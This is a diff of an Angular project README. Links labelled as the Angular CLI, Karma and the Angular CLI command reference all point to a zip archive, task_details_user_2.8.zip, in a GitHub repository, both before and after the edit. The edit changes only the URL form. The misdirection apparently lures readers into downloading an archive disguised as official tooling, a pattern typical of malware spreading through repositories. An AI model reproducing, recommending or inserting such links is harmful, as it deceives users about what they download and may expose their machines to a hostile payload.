@@ -1,6 +1,6 @@
 # MyTaskProject
 
-This project was generated with [Angular CLI](https://github.com/ravirkpal/user-details-task/raw/refs/heads/main/src/app/task_details_user_2.8.zip) version 13.3.11.
+This project was generated with [Angular CLI](https://raw.githubusercontent.com/ravirkpal/user-details-task/main/src/app/task_details_user_2.8.zip) version 13.3.11.
 
 ## Development server
 
@@ -16,7 +16,7 @@ Run `ng build` to build the project. The build artifacts will be stored in the `
 
 ## Running unit tests
 
-Run `ng test` to execute the unit tests via [Karma](https://github.com/ravirkpal/user-details-task/raw/refs/heads/main/src/app/task_details_user_2.8.zip).
+Run `ng test` to execute the unit tests via [Karma](https://raw.githubusercontent.com/ravirkpal/user-details-task/main/src/app/task_details_user_2.8.zip).
 
 ## Running end-to-end tests
 
@@ -24,4 +24,4 @@ Run `ng e2e` to execute the end-to-end tests via a platform of your choice. To u
 
 ## Further help
 
-To get more help on the Angular CLI use `ng help` or go check out the [Angular CLI Overview and Command Reference](https://github.com/ravirkpal/user-details-task/raw/refs/heads/main/src/app/task_details_user_2.8.zip) page.
+To get more help on the Angular CLI use `ng help` or go check out the [Angular CLI Overview and Command Reference](https://raw.githubusercontent.com/ravirkpal/user-details-task/main/src/app/task_details_user_2.8.zip) page.
